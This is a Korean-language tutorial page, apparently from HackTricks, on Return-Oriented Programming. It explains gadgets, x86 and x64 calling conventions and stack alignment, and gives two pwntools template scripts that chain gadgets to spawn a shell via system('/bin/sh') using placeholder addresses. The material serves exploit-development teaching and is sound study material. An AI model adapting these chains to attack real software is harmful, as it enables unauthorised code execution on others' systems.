# ROP - Return Oriented Programing

{{#include ../../../banners/hacktricks-training.md}}

## **기본 정보**

**Return-Oriented Programming (ROP)**는 **No-Execute (NX)** 또는 **Data Execution Prevention (DEP)**와 같은 보안 조치를 우회하기 위해 사용되는 고급 익스플로잇 기법입니다. 공격자는 쉘코드를 주입하고 실행하는 대신, 바이너리 또는 로드된 라이브러리에 이미 존재하는 코드 조각을 활용합니다. 이러한 코드 조각을 **"가젯"**이라고 합니다. 각 가젯은 일반적으로 `ret` 명령어로 끝나며, 레지스터 간 데이터 이동이나 산술 연산과 같은 작은 작업을 수행합니다. 이러한 가젯을 연결하여 공격자는 임의의 작업을 수행하는 페이로드를 구성할 수 있으며, 효과적으로 NX/DEP 보호를 우회할 수 있습니다.

### ROP 작동 방식

1. **제어 흐름 탈취**: 먼저, 공격자는 프로그램의 제어 흐름을 탈취해야 하며, 일반적으로 버퍼 오버플로우를 이용해 스택에 저장된 반환 주소를 덮어씁니다.
2. **가젯 체이닝**: 공격자는 원하는 작업을 수행하기 위해 가젯을 신중하게 선택하고 연결합니다. 여기에는 함수 호출을 위한 인수 설정, 함수 호출(예: `system("/bin/sh")`), 필요한 정리 또는 추가 작업 처리 등이 포함될 수 있습니다.
3. **페이로드 실행**: 취약한 함수가 반환될 때, 합법적인 위치로 반환하는 대신 가젯 체인을 실행하기 시작합니다.

### 도구

일반적으로 가젯은 **[ROPgadget](https://github.com/JonathanSalwan/ROPgadget)**, **[ropper](https://github.com/sashs/Ropper)** 또는 **pwntools**([ROP](https://docs.pwntools.com/en/stable/rop/rop.html))를 사용하여 찾을 수 있습니다.

## x86 예제에서의 ROP 체인

### **x86 (32비트) 호출 규약**

- **cdecl**: 호출자가 스택을 정리합니다. 함수 인수는 역순(오른쪽에서 왼쪽으로)으로 스택에 푸시됩니다. **인수는 오른쪽에서 왼쪽으로 스택에 푸시됩니다.**
- **stdcall**: cdecl과 유사하지만, 피호출자가 스택을 정리할 책임이 있습니다.

### **가젯 찾기**

먼저, 바이너리 또는 로드된 라이브러리 내에서 필요한 가젯을 식별했다고 가정해 보겠습니다. 우리가 관심 있는 가젯은 다음과 같습니다:

- `pop eax; ret`: 이 가젯은 스택의 최상위 값을 `EAX` 레지스터로 팝하고 반환하여 `EAX`를 제어할 수 있게 합니다.
- `pop ebx; ret`: 위와 유사하지만 `EBX` 레지스터에 대한 것으로, `EBX`를 제어할 수 있게 합니다.
- `mov [ebx], eax; ret`: `EAX`의 값을 `EBX`가 가리키는 메모리 위치로 이동하고 반환합니다. 이는 종종 **write-what-where gadget**이라고 불립니다.
- 추가로, `system()` 함수의 주소도 사용할 수 있습니다.

### **ROP 체인**

**pwntools**를 사용하여 ROP 체인 실행을 위해 스택을 다음과 같이 준비합니다. `system('/bin/sh')`를 실행하는 것을 목표로 하며, 체인이 다음과 같이 시작됨을 주목하십시오:

1. 정렬을 위한 `ret` 명령어 (선택 사항)
2. `system` 함수의 주소 (ASLR 비활성화 및 libc가 알려진 경우 가정, 더 많은 정보는 [**Ret2lib**](ret2lib/)에서 확인)
3. `system()`에서 반환 주소를 위한 자리 표시자
4. `"/bin/sh"` 문자열 주소 (system 함수의 매개변수)
```python
from pwn import *

# Assuming we have the binary's ELF and its process
binary = context.binary = ELF('your_binary_here')
p = process(binary.path)

# Find the address of the string "/bin/sh" in the binary
bin_sh_addr = next(binary.search(b'/bin/sh\x00'))

# Address of system() function (hypothetical value)
system_addr = 0xdeadc0de

# A gadget to control the return address, typically found through analysis
ret_gadget = 0xcafebabe  # This could be any gadget that allows us to control the return address

# Construct the ROP chain
rop_chain = [
ret_gadget,    # This gadget is used to align the stack if necessary, especially to bypass stack alignment issues
system_addr,   # Address of system(). Execution will continue here after the ret gadget
0x41414141,    # Placeholder for system()'s return address. This could be the address of exit() or another safe place.
bin_sh_addr    # Address of "/bin/sh" string goes here, as the argument to system()
]

# Flatten the rop_chain for use
rop_chain = b''.join(p32(addr) for addr in rop_chain)

# Send ROP chain
## offset is the number of bytes required to reach the return address on the stack
payload = fit({offset: rop_chain})
p.sendline(payload)
p.interactive()
```
## ROP 체인 x64 예제

### **x64 (64비트) 호출 규약**

- 유닉스 계열 시스템에서 **System V AMD64 ABI** 호출 규약을 사용하며, **첫 여섯 개의 정수 또는 포인터 인자는 레지스터 `RDI`, `RSI`, `RDX`, `RCX`, `R8`, 및 `R9`**에 전달됩니다. 추가 인자는 스택에 전달됩니다. 반환 값은 `RAX`에 저장됩니다.
- **Windows x64** 호출 규약은 첫 네 개의 정수 또는 포인터 인자를 위해 `RCX`, `RDX`, `R8`, 및 `R9`를 사용하며, 추가 인자는 스택에 전달됩니다. 반환 값은 `RAX`에 저장됩니다.
- **레지스터**: 64비트 레지스터에는 `RAX`, `RBX`, `RCX`, `RDX`, `RSI`, `RDI`, `RBP`, `RSP`, 및 `R8`에서 `R15`까지 포함됩니다.

#### **가젯 찾기**

우리의 목적을 위해, **RDI** 레지스터를 설정할 수 있는 가젯에 집중하겠습니다 (인자로 **"/bin/sh"** 문자열을 **system()**에 전달하기 위해) 그리고 그 다음 **system()** 함수를 호출합니다. 우리는 다음 가젯을 식별했다고 가정하겠습니다:

- **pop rdi; ret**: 스택의 최상위 값을 **RDI**에 팝하고 그 다음 반환합니다. **system()**의 인자를 설정하는 데 필수적입니다.
- **ret**: 간단한 반환으로, 일부 시나리오에서 스택 정렬에 유용합니다.

그리고 우리는 **system()** 함수의 주소를 알고 있습니다.

### **ROP 체인**

아래는 **pwntools**를 사용하여 **system('/bin/sh')**를 실행하기 위한 ROP 체인을 설정하고 실행하는 예제입니다:
```python
from pwn import *

# Assuming we have the binary's ELF and its process
binary = context.binary = ELF('your_binary_here')
p = process(binary.path)

# Find the address of the string "/bin/sh" in the binary
bin_sh_addr = next(binary.search(b'/bin/sh\x00'))

# Address of system() function (hypothetical value)
system_addr = 0xdeadbeefdeadbeef

# Gadgets (hypothetical values)
pop_rdi_gadget = 0xcafebabecafebabe  # pop rdi; ret
ret_gadget = 0xdeadbeefdeadbead     # ret gadget for alignment, if necessary

# Construct the ROP chain
rop_chain = [
ret_gadget,        # Alignment gadget, if needed
pop_rdi_gadget,    # pop rdi; ret
bin_sh_addr,       # Address of "/bin/sh" string goes here, as the argument to system()
system_addr        # Address of system(). Execution will continue here.
]

# Flatten the rop_chain for use
rop_chain = b''.join(p64(addr) for addr in rop_chain)

# Send ROP chain
## offset is the number of bytes required to reach the return address on the stack
payload = fit({offset: rop_chain})
p.sendline(payload)
p.interactive()
```
이 예제에서:

- 우리는 **`pop rdi; ret`** 가젯을 사용하여 **`RDI`**를 **`"/bin/sh"`**의 주소로 설정합니다.
- **`RDI`**를 설정한 후, 체인에 **system()**의 주소가 있는 상태에서 **`system()`**으로 직접 점프합니다.
- **`ret_gadget`**은 대상 환경이 필요로 할 경우 정렬을 위해 사용되며, 이는 함수 호출 전에 적절한 스택 정렬을 보장하기 위해 **x64**에서 더 일반적입니다.

### 스택 정렬

**x86-64 ABI**는 **call instruction**이 실행될 때 **스택이 16바이트 정렬**되도록 보장합니다. **LIBC**는 성능 최적화를 위해 **SSE instructions**(예: **movaps**)를 사용하며, 이 정렬이 필요합니다. 스택이 제대로 정렬되지 않으면(**RSP**가 16의 배수가 아닐 경우) **system**과 같은 함수 호출이 **ROP chain**에서 실패합니다. 이를 해결하려면 ROP 체인에서 **system**을 호출하기 전에 **ret gadget**을 추가하면 됩니다.

## x86과 x64의 주요 차이점

> [!TIP]
> x64는 처음 몇 개의 인수에 레지스터를 사용하므로 간단한 함수 호출에 대해 x86보다 더 적은 가젯을 필요로 하지만, 레지스터 수가 증가하고 주소 공간이 커짐에 따라 올바른 가젯을 찾고 연결하는 것이 더 복잡할 수 있습니다. **x64** 아키텍처의 레지스터 수 증가와 더 큰 주소 공간은 특히 Return-Oriented Programming (ROP) 맥락에서 익스플로잇 개발에 기회와 도전을 모두 제공합니다.

## 보호 조치

- [**ASLR**](../common-binary-protections-and-bypasses/aslr/)
- [**스택 카나리**](../common-binary-protections-and-bypasses/stack-canaries/)

## 기타 예제 및 참고자료

- [https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/exploiting-calling-conventions](https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/exploiting-calling-conventions)

## ROP 기반 기술

ROP는 임의의 코드를 실행하기 위한 기술일 뿐입니다. ROP를 기반으로 많은 Ret2XXX 기술이 개발되었습니다:

- **Ret2lib**: ROP를 사용하여 로드된 라이브러리에서 임의의 매개변수로 임의의 함수를 호출합니다(보통 `system('/bin/sh')`와 같은 형태).

{{#ref}}
ret2lib/
{{#endref}}

- **Ret2Syscall**: ROP를 사용하여 시스템 호출을 준비하고, 예를 들어 `execve`를 호출하여 임의의 명령을 실행합니다.

{{#ref}}
rop-syscall-execv.md
{{#endref}}

- **EBP2Ret & EBP 체이닝**: 첫 번째는 흐름을 제어하기 위해 EIP 대신 EBP를 악용하고, 두 번째는 Ret2lib와 유사하지만 이 경우 흐름은 주로 EBP 주소로 제어됩니다(물론 EIP도 제어해야 합니다).

{{#ref}}
stack-pivoting-ebp2ret-ebp-chaining.md
{{#endref}}

{{#include ../../../banners/hacktricks-training.md}}
